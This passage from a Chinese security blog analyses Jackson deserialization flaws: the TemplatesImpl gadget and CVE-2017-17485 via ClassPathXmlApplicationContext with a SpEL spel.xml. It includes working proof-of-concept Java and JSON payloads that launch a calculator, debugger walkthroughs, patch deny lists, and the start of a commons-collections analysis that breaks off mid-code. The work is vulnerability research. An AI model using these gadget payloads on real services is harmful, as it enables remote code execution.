<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String exp = readClassStr(<span class="string">"/Users/fengxincheng/Desktop/jackson_test/target/classes/com/TemplateImpl/Exploit.class"</span>);</span><br><span class="line">        String jsonInput = aposToQuotes(<span class="string">"&#123;\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n"</span> +</span><br><span class="line">                <span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"'transletBytecodes':['"</span>+exp+<span class="string">"'],\n"</span> +</span><br><span class="line">                <span class="string">"'transletName':'test',\n"</span> +</span><br><span class="line">                <span class="string">"'outputProperties':&#123;&#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;\n"</span> +</span><br><span class="line">                <span class="string">"]\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Test test;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, Test<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">aposToQuotes</span><span class="params">(String json)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">"'"</span>,<span class="string">"\""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClassStr</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)),byteArrayOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果，成功弹出计算器：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916165821761.png" alt="image-20200916165821761"></p>
<p>这里我们看下PoC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;object&quot;:[</span><br><span class="line">        &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;transletBytecodes&quot;:[&quot;xxx&quot;],</span><br><span class="line">            &quot;transletName&quot;:&quot;test&quot;,</span><br><span class="line">            &quot;outputProperties&quot;:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里解释下设置的几个JSON键值对：</p>
<ul>
<li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列；</li>
<li>transletName——TemplatesImpl类对象的_name属性值；</li>
<li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li>
</ul>
<h3 id="跟进调试"><a href="#跟进调试" class="headerlink" title="跟进调试"></a>跟进调试</h3><p>在<code>mapper.readValue(jsonInput, Mi1k7ea.class);</code>中打下断点；同时，我们由之前Fastjson中的分析也知道，TemplatesImpl利用链的其中一步是调用了getOutputProperties()函数，我们也在这里打下断点。</p>
<p>下面开始调试，其中反序列化的处理过程和之前调试的一样，我们直接跟到关键的地方看看就好。</p>
<p>我们知道在BeanDeserializer.vanillaDeserialize()函数中会先新建Bean实例，然后调用deserializeAndSet()函数来解析属性值并设置到该Bean中；而在deserializeAndSet()函数中，会反射调用属性的setter方法来设置属性值。</p>
<p>前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，<strong>但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因，虽然Jackson的反序列化机制只是调用setter方法，但是是调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法</strong>。</p>
<p><strong>利用链：getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数</strong></p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/dxhgj.jpg" alt="img"></p>
<p>PoC不写该属性值的话会报错，我们调试分析下原因。</p>
<p>跟踪到getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()这条调用链时发现，问题出在TemplatesImpl.getTransletInstance()函数中：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/6.png" alt="img"></p>
<p>由于此处_name为null，导致程序提前return了，并未进入后面生成该Java类实例的代码中，从而也无法成功触发漏洞。</p>
<p>由前面调试分析可知，transletBytecodes和transletName属性值都是通过调用MethodProperty.deserializeAndSet()函数来反射调用其setter方法来设置的。</p>
<p>这里重新带上transletName属性，再次调试，跟进设置transletName属性值时的MethodProperty.deserializeAndSet()函数中，发现其调用的setter方法就是TemplatesImpl.setTransletName()函数：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/7.png" alt="img"></p>
<p>在大版本下，JDK1.7和1.8中，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类是有所不同的。</p>
<p>当然，在小版本较高的1.7和某些1.8的还是能够成功触发的，具体的可自行测试。</p>
<p>在我本地的JDK 1.8.0_73 版本中，看到在TemplatesImpl.getTransletInstance()方法中调用了defineTransletClasses()函数来定义Java类，跟进看看：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/8.png" alt="img"></p>
<p>区别在于新建TransletClassLoader类实例的代码，其中调用了<code>_factory</code>属性，但是该属性值我们没有在PoC中设置，默认为null，于是就会抛出异常了。</p>
<p>那么如何设置这个<code>_factory</code>属性呢？我们在PoC中随便填入如<code>&#39;_factory&#39;:{},</code>，会看到如下错误信息：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "_factory" (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: "uriresolver", "transletBytecodes", "outputProperties", "transletName", "stylesheetDOM"])</span><br></pre></td></tr></table></figure>

<p>可以看到，这个错误是Jackson.databind报的，说的是TemplatesImpl类已知的只有5个配置项，即”uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”。</p>
<p>在里面没有看到tfactory相关字样，也就是说，<strong>Jackson压根就不支持我们在序列化的TemplatesImpl类的内容上添加并解析_tfactory属性</strong>。</p>
<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里将jackson-databind-2.7.9换成jackson-databind-2.7.9.1。</p>
<p>尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: <span class="function">Illegal <span class="title">type</span> <span class="params">(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl)</span> to deserialize: prevented <span class="keyword">for</span> security reasons</span></span><br></pre></td></tr></table></figure>

<p>调试分析，在调用BeanDeserializerFactory.createBeanDeserializer()函数创建Bean反序列化器的时候，其中会调用checkIllegalTypes()函数提取当前类名，然后使用黑名单进行过滤：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/9.png" alt="img"></p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/10.png" alt="img"></p>
<p>注意：实际调试的时候回调用两次BeanDeserializerFactory.createBeanDeserializer()-&gt;checkIllegalTypes()，第一次由于是Mi1k7ea类，因此不会被过滤；第二次是TemplatesImpl类，由于其在黑名单中，因此被过滤了。</p>
<p>在jackson-databind-2.7.9.1-sources.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java中，存在默认的黑名单DEFAULT_NO_DESER_CLASS_NAMES，将TemplatesImpl类以及早期其他常用反序列化利用类都过滤了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599]</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"><a href="#CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）" class="headerlink" title="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"></a>CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.7系列 &lt; 2.7.9.2</p>
<p>Jackson 2.8系列 &lt; 2.8.11</p>
<p>Jackson 2.9系列 &lt; 2.9.4</p>
<p>不受JDK限制，可直接在JDK1.8上运行。</p>
<p>需要服务端环境存在额外的jar包，以本地环境为例：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-expression-5.0.2.RELEASE，commons-logging-1.2。</p>
<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>该漏洞需要 Spting spel表达式的配合。</p>
<p>首先在本地起一个http服务，spel.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"whatever"</span> <span class="attr">value</span>=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>PoC代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8000/spel.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功触发：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200917093034830.png" alt="image-20200917093034830"></p>
<h3 id="跟进调试-1"><a href="#跟进调试-1" class="headerlink" title="跟进调试"></a>跟进调试</h3><p>本次的利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p>
<p>我们在<code>mapper.readValue(payload, Object.class);</code>上打上断点开始调试。</p>
<p>首先进入：</p>
<p>调试到UntypedObjectDeserializer.deserializeWithType()函数，其中会调用AsArrayTypeDeserializer.deserializeTypedFromAny()函数来解析我们数组形式的JSON内容：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921090545952.png" alt="image-20200921090545952"></p>
<p>继续往下调试，我们在看会调用BeanDeserializerBase.deserializeFromString()函数来反序列化字符串内容，它会返回一个调用createFromString()函数从字符串中创建的实例对象：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921092147826.png" alt="image-20200921092147826"></p>
<p>跟进去看StdValueInstantiator.createFromString()函数，此时_fromStringCreator变量为AnnotatedConstructor类实例，参数value值为<code>http://127.0.0.1:8000/spel.xml</code>，接着就是调用AnnotatedConstructor.call1()：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921092750189.png" alt="image-20200921092750189"></p>
<p>继续向下调试，<code>this._fromStringCreator.call1(value);</code>这个函数，发现调用了Constructor.newInstance()方法来创建新的实例：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921093114544.png" alt="image-20200921093114544"></p>
<p>往下调试，会调用到ClassPathXmlApplicationContext类的构造函数，看到configLocations参数值为spel.xml文件所在的URL地址，由于refresh参数值为True，因此会调用到refresh()函数：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921093439304.png" alt="image-20200921093439304"></p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921093528071.png" alt="image-20200921093528071"></p>
<p><strong>注意：前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。</strong></p>
<p>下面我们继续调试看看ClassPathXmlApplicationContext类的构造函数中是哪里存在有漏洞。</p>
<p>跟进refresh()函数，进行一系列refresh之前的准备操作后，发现调用了invokeBeanFactoryPostProcessors()函数，顾名思义，就是调用上下文中注册为beans的工厂处理器：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921095905752.png" alt="image-20200921095905752"></p>
<p>跟进invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921095841381.png" alt="image-20200921095841381"></p>
<p>跟进往下，进一步调用doGetBeanNamesForType()函数：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101509311.png" alt="image-20200921101509311"></p>
<p>在doGetBeanNamesForType()函数中，调用isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101648261.png" alt="image-20200921101648261"></p>
<p>在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101725897.png" alt="image-20200921101725897"></p>
<p>跟进predictBeanType函数，通过调用determineTargetType()函数来预测Bean类型：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101900449.png" alt="image-20200921101900449"></p>
<p>跟进去，determineTargetType()函数中通过调用getTargetType()函数来确定目标类型：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102326853.png" alt="image-20200921102326853"></p>
<p>跟下去，AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()，用来解析Bean类，其中调用了evaluateBeanDefinitionString()函数来执行Bean定义的字符串内容，此时className参数指向”java.lang.ProcessBuilder”：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102600420.png" alt="image-20200921102600420"></p>
<p>跟进AbstractBeanFactory.evaluateBeanDefinitionString()函数，其中调用了this.beanExpressionResolver.evaluate()，此时this.beanExpressionResolver指向的是StandardBeanExpressionResolver，也就是说已经调用到对应的SpEL表达式解析器了：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102820137.png" alt="image-20200921102820137"></p>
<p>跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102902544.png" alt="image-20200921102902544"></p>
<p>至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。</p>
<h3 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看一下换成jackson-databind-2.7.9.2版本的jar试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：</p>
<p><code>com.fasterxml.jackson.databind.JsonMappingException: Illegal type (org.springframework.context.support.ClassPathXmlApplicationContext) to deserialize: prevented for security reasons</code></p>
<p>在jackson-databind-2.7.9.2-sources.jar!\com\fasterxml\jackson\databind\jsontype\impl\SubTypeValidator.java中可以看到具体的黑名单信息，很遗憾的是没看到我们的利用类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance</span></span><br><span class="line">    s.add(<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided</span></span><br><span class="line">    s.add(<span class="string">"java.util.logging.FileHandler"</span>);</span><br><span class="line">    s.add(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party</span></span><br><span class="line">    <span class="comment">//s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor"); // deprecated by [databind#1855]</span></span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>);</span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party</span></span><br><span class="line">    s.add(<span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>那么如何修补的呢？调试看看。</p>
<p>在调用BeanDeserializerFactory.createBeanDeserializer()时，其中会调用_validateSubType()函数对子类型进行校验：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921103800554.png" alt="image-20200921103800554"></p>
<p>在SubTypeValidator._validateSubType()函数中看到，先进行黑名单过滤，发现类名不在黑名单后再判断是否是以”org.springframe”开头的类名，是的话循环遍历目标类的父类是否为”AbstractPointcutAdvisor”或”AbstractApplicationContext”，是的话跳出循环然后抛出异常：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921103927724.png" alt="image-20200921103927724"></p>
<p>而我们的利用类其继承关系是这样的：</p>
<p>…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</p>
<p>可以看到，ClassPathXmlApplicationContext类是继承自AbstractApplicationContext类的，而该类会被过滤掉，从而没办法成功绕过利用。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB" target="_blank" rel="noopener">1</a></p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">2</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>【反序列化漏洞】commons-collections-1 组件</title>
    <url>/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>往事依稀浑似梦，都随风雨到心头。</p>
</blockquote>
<p>今天来看经典漏洞CC链，害，经典还债环节。</p>
<a id="more"></a>

<h1 id="commons-collections-1"><a href="#commons-collections-1" class="headerlink" title="commons-collections-1"></a>commons-collections-1</h1><p>首先来看看<a href="http://commons.apache.org/proper/commons-collections/index.html" target="_blank" rel="noopener">commons-collections项目</a>吧<br>官网第一段：</p>
<blockquote>
<p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p>
</blockquote>
<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
<p>Java集合：Collection，Map</p>
<p>Collection：List，Set</p>
<p>Map：HashMap</p>
<p>它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能：</p>
<blockquote>
<ul>
<li>Transforming decorators that alter each object as it is added to the collection</li>
<li>转化装饰器：修改每一个添加到collection中的object</li>
</ul>
</blockquote>
<p><strong>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</strong></p>
<p><code>org.apache.commons.collections.Transformer</code>这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是利用了这一点。</p>
<p>漏洞复现需要下载3.1版本源码<a href="http://archive.apache.org/dist/commons/collections/binaries/" target="_blank" rel="noopener">3.1版本的下载地址</a>，进去寻觅一下源码和jar包都有。</p>
<h1 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h1><p>这里找一个网上传烂了的PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 